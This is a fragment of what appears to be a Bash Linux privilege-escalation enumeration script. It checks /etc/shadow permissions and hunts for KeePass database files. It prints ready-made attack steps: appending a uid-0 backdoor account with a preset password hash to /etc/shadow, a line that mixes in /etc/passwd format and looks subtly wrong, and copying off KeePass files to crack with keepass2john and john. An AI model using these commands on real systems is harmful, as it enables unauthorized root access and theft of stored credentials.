...
echo -e "\n${BLUE}[+] Shadow file:\033[0m"
    ls -la /etc/shadow --color=always
        ...
        echo -e "\t  ║${RED}echo 'privesc:Npge08pfz4wuk:0:0:privesc,,,:/:/bin/bash' >> /etc/shadow\033[0m             ║"
...
echo -e "[*] .kdb files:"
    find / -name *.kdb -type f 2>/dev/null
        ...
        echo -e "\t  ║${RED}Exploit:\033[0m                                                          ║"
        echo -e "\t  ║  ${RED}Get the file to your local PC\033[0m                                                ║"
        echo -e "\t  ║  ${RED}keepass2john file.kdbx > hash\033[0m                                                ║"
        echo -e "\t  ║  ${RED}john hash\033[0m                                                                    ║"
        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
